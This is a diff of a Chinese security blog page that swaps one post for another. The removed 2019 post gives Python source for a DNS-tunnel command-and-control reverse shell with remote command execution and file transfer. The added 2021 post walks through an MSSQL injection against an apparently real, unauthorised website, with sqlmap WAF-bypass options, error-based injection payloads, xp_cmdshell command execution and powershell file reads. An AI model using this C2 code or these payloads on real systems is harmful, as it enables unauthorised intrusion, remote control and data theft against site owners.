@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>一个很像cxk的dns_c2 | 九世的博客</title>
-  <meta name="keywords" content=" Writing ">
-  <meta name="description" content="一个很像cxk的dns_c2 | 九世的博客">
+  <title>一次糟糕的mssql注入尝试 | 九世的博客</title>
+  <meta name="keywords" content=" 渗透 ">
+  <meta name="description" content="一次糟糕的mssql注入尝试 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="友链BGM:拔剑神曲   即刻安全 Hacking 木头的博客 hackhat社区 Xhong的博客">
 <meta property="og:type" content="website">
@@ -1629,9 +1629,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-一个很像cxk的dns-c2" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-一次糟糕的mssql注入尝试" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">一个很像cxk的dns_c2</h1>
+        <h1 class="article-title">一次糟糕的mssql注入尝试</h1>
     
     <div class="article-meta">
         
@@ -1640,14 +1640,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">Writing</a>
+            <a href="javascript:" class="color3">渗透</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-05-02 23:14:50">2019-05-02 21:11</time>
+        创建时间:<time class="date" title="更新时间: 2021-02-13 23:10:38">2021-02-13 21:51</time>
         
     </div>
     <div class="article-meta">
@@ -1669,7 +1669,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#思路"><span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#实现他"><span class="toc-text">实现他</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#测试截图"><span class="toc-text">测试截图</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#观前提醒"><span class="toc-text">观前提醒</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#过程"><span class="toc-text">过程</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1684,189 +1684,42 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>算是一个很像cxk的东西，有个BUG一直解决不了<br>而且还时不时的像报错。。。。emmmm<br><img src="http://img4.imgtn.bdimg.com/it/u=1940277742,2702113996&amp;fm=26&amp;gp=0.jpg" alt=""></p>
-<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>五一之前在sec-wiki看到某文章<br>传送门:<a href="https://www.cnblogs.com/LittleHann/p/8656621.html" target="_blank" rel="noopener">DNS Tunnel隧道隐蔽通信实验 &amp;&amp; 尝试复现特征向量化思维方式检测</a><br>根据文章所描述的，我这个c2应该属于第一种</p>
-<p>我在写之前上GitHub搜了一下dns shell找到了一个不错的项目<br>传送门:<a href="https://github.com/ahhh/Reverse_DNS_Shell/" target="_blank" rel="noopener">DNS_Shell</a></p>
-<p>根据上面项目所用到的东西</p>
-<pre><code class="`">dnslib模块 --- 处理dns包
-dnspython --- 发送dns请求
-</code></pre>
-<p>当然你也可以用scapy手动构造一个dns的数据包然后在发送出去….</p>
-<p>项目里面接收dns包的时候是用socket创建一个UDP，然后监听53端口，监听数据<br>获取到的数据使用dnslib，模块进行解包便可获得想要的数据</p>
-<p>dns_shell算是个反向shell，必须由客户端发送请求。服务端回应该数据<br>虽然写的时候有点困难。我是实现第一种c2，使用的是TXT记录类型。TXT类型有限制数据不能大于63个字节<br>所以必须得分段发送</p>
-<h2 id="实现他"><a href="#实现他" class="headerlink" title="实现他"></a>实现他</h2><p><b>Server端</b><br>解dns包的函数</p>
-<pre><code class="python">    def dnsj(self,data):
-        dr=dnslib.DNSRecord.parse(data) #dns数据包转换
-        answer=dr.reply() #获取全部数据
-        return answer,dr.questions[0].qname.label[0] #获取请求前的dns包和指定数据
-</code></pre>
-<p>打包为dns包的函数</p>
-<pre><code class="python">    def dnsc(self,answer,data):
-        answer.add_answer(*dnslib.RR.fromZone(&#39;{}.com 60 TXT&#39;.format(data)))
-        return answer
-</code></pre>
-<p>主要函数</p>
-<pre><code class="python"> global s,address
-        he = [&#39;cmd---&gt;命令行交互&#39;,&#39;upload---&gt;文件上传&#39;,&#39;download---&gt;文件下载&#39;,&#39;exit---&gt;退出&#39;]
-        hps={&#39;cmd&#39;: self.cmd,&#39;upload&#39;:self.upload,&#39;download&#39;:self.download,&#39;exit&#39;:exit}
-        s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
-        s.bind((self.host,int(self.port)))
-        data,address=s.recvfrom(1024)
-        print(&#39;[+] 来源IP:{},来源端口:{}&#39;.format(address[0],address[1]))
-        dnsj=self.dnsj(data)
-        demo=self.jiemi(dnsj[1])
-        if demo:
-            print(&#39;[+] {}:{}&lt;----&gt;{}:{}&#39;.format(self.host,self.port,address[0],address[1]))
-            print(&#39;+请执行你的操作，如果有问题请输入help&#39;)
-            demos=self.jiami(&#39;demo&#39;)
-            fs=self.dnsc(dnsj[0],demos)
-            s.sendto(fs.pack(),address)
-            while True:
-                xw=input(&#39;Jarvis:&#39;)
-                if xw in hps:
-                    try:
-                        hps[xw]()
-                    except Exception as r:
-                        print(&#39;-- Error:{}&#39;.format(r))
-                elif xw==&#39;help&#39;:
-                    print(&#39;&#39;)
-                    for h in he:
-                        print(h)
-                else:
-                    print(&#39;-没有这种操作&#39;)
-                    continue
-</code></pre>
-<p><b>Client端</b><br>主要函数</p>
-<pre><code class="python"> def beikon(self):
-        hk={&#39;cmd&#39;:self.cmd,&#39;upload&#39;:self.upload,&#39;download&#39;:self.download}
-        demo=&#39;demo&#39;
-        demo=self.jiami(demo)
-        bbc=self.fs(demo)
-        kk=self.zz(bbc)
-        jm=self.jiemi(kk.encode(&#39;utf-8&#39;))
-        if jm:
-            while True:
-                try:
-                    g=&#39;ok&#39;
-                    demo = self.jiami(g)
-                    bbc = self.fs(demo)
-                    kk = self.zz(bbc)
-                    jm = self.jiemi(kk.encode(&#39;utf-8&#39;))
-                    if jm in hk:
-                        hk[jm]()
-                except:
-                    pass
-</code></pre>
-<p><b>对应功能对照的函数</b><br>命令行交互<br>server端</p>
-<pre><code class="python"> def cmd(self):
-        self.ok(&#39;cmd&#39;)
-        while True:
-            jb, jc = s.recvfrom(1024)
-            dnsj = self.dnsj(jb)
-            demo = self.jiemi(dnsj[1])
-            if demo!=&#39;cmd&#39; and demo !=&#39;long&#39;:
-                print(demo)
-                demos = self.jiami(&#39;cmd&#39;)
-                fs = self.dnsc(dnsj[0], demos)
-                s.sendto(fs.pack(), jc)
-            elif demo==&#39;long&#39;:
-                changdu=0
-                jg=b&#39;&#39;
-                demos = self.jiami(&#39;long&#39;)
-                fs = self.dnsc(dnsj[0], demos)
-                s.sendto(fs.pack(), jc)
-
-                c,d= s.recvfrom(1024)
-                dnsj = self.dnsj(c)
-                demo=self.jiemi(dnsj[1])
-                if str(demo).isdigit()==True:
-                    changdu+=int(demo)
-                print(changdu)
-                demos = self.jiami(&#39;{}&#39;.format(changdu))
-                fs = self.dnsc(dnsj[0], demos)
-                s.sendto(fs.pack(), d)
-                while True:
-                    d,e = s.recvfrom(1024)
-                    dnsj = self.dnsj(d)
-                    jg+=dnsj[1]
-                    if len(jg)==changdu:
-                        jmk=self.jiemi(jg)
-                        print(jmk)
-                        fs = self.dnsc(dnsj[0], &#39;break&#39;)
-                        s.sendto(fs.pack(), e)
-                        break
-                    demos = self.jiami(&#39;jx&#39;)
-                    fs = self.dnsc(dnsj[0], demos)
-                    s.sendto(fs.pack(), e)
-
-            else:
-                shell=input(&#39;Jarvis_shell:&#39;)
-                if shell==&#39;exit&#39;:
-                    demos = self.jiami(&#39;exit&#39;)
-                    fs = self.dnsc(dnsj[0], demos)
-                    s.sendto(fs.pack(), jc)
-                    break
-                demos = self.jiami(shell)
-                fs = self.dnsc(dnsj[0], demos)
-                s.sendto(fs.pack(), jc)
-
-
-</code></pre>
-<p>client端</p>
-<pre><code class="python">    def cmd(self):
-        while True:
-            g=&#39;cmd&#39;
-            demo = self.jiami(g)
-            bbc = self.fs(demo)
-            kk = self.zz(bbc)
-            jm = self.jiemi(kk.encode(&#39;utf-8&#39;))
-            if jm == &#39;exit&#39;:
-                break
-            else:
-                zx=os.popen(jm)
-                if zx:
-                    g=zx.read()
-                    demos = self.jiami(g)
-                    if len(demos)&lt;64:
-                        if len(demos)==0:
-                            demos=self.jiami(jm)
-                        bbc = self.fs(demos)
-                        kk = self.zz(bbc)
-                        jm = self.jiemi(kk.encode(&#39;utf-8&#39;))
-                        if jm:
-                            continue
-                    else:
-                        g=&#39;long&#39;
-                        demo = self.jiami(g)
-                        bbc = self.fs(demo)
-                        kk = self.zz(bbc)
-                        jm = self.jiemi(kk.encode(&#39;utf-8&#39;))
-                        if jm:
-                            g = len(demos)
-                            demo = self.jiami(g)
-                            bbc = self.fs(demo)
-                            kk = self.zz(bbc)
-                            jm = self.jiemi(kk.encode(&#39;utf-8&#39;))
-                            if jm:
-                                b=0
-                                e=32
-                                for u in demos:
-                                    g=demos[b:e]
-                                    b+=32
-                                    e+=32
-                                    bbc=self.fs(g)
-                                    kk = self.zz(bbc)
-                                    if kk==&#39;break&#39;:
-                                        break
-
-</code></pre>
-<p><b>仓库地址</b>:<a href="https://github.com/422926799/python/tree/master/dns_c2" target="_blank" rel="noopener">https://github.com/422926799/python/tree/master/dns_c2</a></p>
-<h2 id="测试截图"><a href="#测试截图" class="headerlink" title="测试截图"></a>测试截图</h2><p><img src="https://s2.ax1x.com/2019/05/02/ENMlz4.gif" alt=""></p>
-<p><img src="https://s2.ax1x.com/2019/05/02/ENM8y9.gif" alt=""></p>
-<p><img src="https://s2.ax1x.com/2019/05/02/ENMGLR.gif" alt=""></p>
-<p><img src="https://s2.ax1x.com/2019/05/02/ENMYe1.gif" alt=""></p>
-<p><b>抓包截图</b><br><img src="https://s2.ax1x.com/2019/05/02/ENMtdx.gif" alt=""></p>
-<p>转载请声明:转自422926799.github.io</p>
+        <h2 id="观前提醒"><a href="#观前提醒" class="headerlink" title="观前提醒"></a>观前提醒</h2><p>本文已对实际的人以游戏或番剧人名代替</p>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>源于昨天一次组团冲塔的时候发现的一个站。原本随便看一下，没注入就换目标。结果呢<br>随手一测还真有个注入。然后开始漫长的摸索…</p>
+<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>一个熟悉的登录框<br><img src="https://s3.ax1x.com/2021/02/13/ysQszT.png" alt=""></p>
+<p>哎，反手一个引号。<code>sql server Error</code><br><img src="https://s3.ax1x.com/2021/02/13/ysQReJ.png" alt=""></p>
+<p>sqlmap扔进去？没跑出来，经过测试，得到sqlmap command绕过 WAF （空气waf就像3090一样根本不存在）</p>
+<pre><code>sudo proxychains sqlmap -r post.txt --tamper=space2randomblank.py,equaltolike.py -v 3
+</code></pre><p>盲注，慢的一批<br><img src="https://s3.ax1x.com/2021/02/13/ysQbOe.png" alt=""></p>
+<p>就在逐个跑表的时候，一名A哥已经手注了。这时我赶紧白嫖了A哥的payload</p>
+<pre><code>id=1&#39; and 1&lt;(select @@version) --&amp;password=11111
+</code></pre><p>报错注入bingo<br><img src="https://s3.ax1x.com/2021/02/13/yslulT.png" alt=""></p>
+<p>获取所有表名或子段名/某指定表名</p>
+<pre><code>id=admin&#39; and 1&lt;(select QUOTENAME(TABLE_NAME) from INFORMATION_SCHEMA.TABLES where TABLE_CATALOG=DB_NAME()  FOR XML PATH(&#39;&#39;))--&amp;passwd=dasdasd
+id=admin&#39; and 1&lt;(select QUOTENAME(COLUMN_NAME) from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME=&#39;wwwlog&#39;  FOR XML PATH(&#39;&#39;))--&amp;passwd=dasdasd
+id=admin&#39; and 1&lt;(select QUOTENAME(COLUMN_NAME) from INFORMATION_SCHEMA.COLUMNS where TABLE_CATALOG=DB_NAME()  FOR XML PATH(&#39;&#39;))--&amp;passwd=dasdasd
+id=admin&#39; and 1&lt;(select QUOTENAME(UNAME) from master dbo.wwwlog FOR XML PATH(&#39;&#39;))--&amp;passwd=dasdasd
+</code></pre><p>后发现sqlmap跑出来的数据和查出来的差一大截，索性不用sqlmap<br><img src="https://s3.ax1x.com/2021/02/13/yslq3V.png" alt=""></p>
+<p>后面测试多段注入使用cmd_shell尝试能否使用的时候，发现并未成功（后面发现的原因是master..xp_cmdshell不行，直接xp_cmdshell就可以？？？？）<br><img src="https://s3.ax1x.com/2021/02/13/ys1zM8.png" alt=""></p>
+<p><img src="https://s3.ax1x.com/2021/02/13/ys3NLD.png" alt=""></p>
+<p>思考半天后不知如何实现回显RCE，后搜到一篇文章如醍醐灌顶。<br>创建表，把执行结果插入到表里然后读取即可</p>
+<pre><code>id=admin&#39; CREATE TABLE tmpx (tmp1 varchar(max),tmp2 varchar(max))--&amp;password=11
+id=admin&#39; insert into tmpx (tmp1) exec xp_cmdshell &#39;whoami&#39;--&amp;password=11
+id=admin&#39; and 1&lt;(select QUOTENAME(tmp1) from tmpx FOR XML PATH(&#39;&#39;)) --&amp;password=11
+id=admin&#39; drop table tmpx --&amp;password=11
+</code></pre><p><img src="https://s3.ax1x.com/2021/02/13/ys3NLD.png" alt=""></p>
+<p>为了方便执行命令，写了个py<br><img src="https://s3.ax1x.com/2021/02/13/ysG8KK.png" alt=""></p>
+<p>然后遇见的几个坑<br>1.type读文件不行<br>2.sql server的表存储内容大小有限，超过会被截断</p>
+<p>解决方法统一用powershell来代替<br>读取进程</p>
+<pre><code>powershell &quot;tasklist /svc | Select -First 35&quot; #读取到35行
+powershell &quot;$data=tasklist /svc;$data[36..60]&quot; #从36行读到60行
+</code></pre><p>用上面的第二条命令逐行读取直到读完全部<br><img src="https://s3.ax1x.com/2021/02/13/ysJmsf.png" alt=""></p>
+<p><img src="https://s3.ax1x.com/2021/02/13/ysJQoQ.png" alt=""></p>
+<p>powershell代替type命令读取文件</p>
+<pre><code>powershell &quot;get-content C:\Windows\System32\drivers\etc\hosts&quot;
+powershell &quot;get-content C:\Windows\System32\drivers\etc\hosts | Select -First 10&quot;
+</code></pre><p><img src="https://s3.ax1x.com/2021/02/13/ysJIfA.png" alt=""></p>
+<p>尝试上线提权发现，shell连几秒后马上断开。最后确定是IDS的问题，现在卡在这个地方…</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1876,12 +1729,12 @@ dnspython --- 发送dns请求
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>一个很像cxk的dns_c2</p>
+    <p><span class="copy-title">文章标题:</span>一次糟糕的mssql注入尝试</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-05-02, 21:11:11</p>
-    <p><span class="copy-title">最后更新:</span>2019-05-02, 23:14:50</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/126651c2.html" title="一个很像cxk的dns_c2">http://422926799.github.io/posts/126651c2.html</a>
+    <p><span class="copy-title">发布时间:</span>2021-02-13, 21:51:15</p>
+    <p><span class="copy-title">最后更新:</span>2021-02-13, 23:10:38</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/976028d5.html" title="一次糟糕的mssql注入尝试">http://422926799.github.io/posts/976028d5.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
